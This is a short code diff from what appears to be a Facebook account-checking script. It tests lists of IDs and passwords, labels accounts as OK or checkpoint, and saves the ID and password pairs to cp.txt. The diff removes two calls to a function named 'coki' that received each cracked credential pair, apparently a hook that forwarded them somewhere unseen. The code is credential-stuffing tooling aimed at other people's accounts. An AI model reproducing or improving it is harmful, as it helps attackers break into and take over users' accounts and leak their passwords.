@@ -79,12 +79,10 @@ def check_ids(filename):
         elif 'www.facebook.com' in q['error']['message']:
             print(f"[CP] {sid} | {ps}")
             cps.append(sid)
-            coki(f"[CP] {sid} | {ps}")
             with open(os.path.join(os.path.dirname(filename), 'cp.txt'), 'a') as f:
                 f.write(f"{sid} | {ps}\n")
         else:
             print(f"[CP] {sid} | {ps}")
-            coki(f"[CP] {sid} | {ps}")
 
     print(f"Finished checking {len(lines)} ids.")
     print(f"OKs: {len(oks)}")
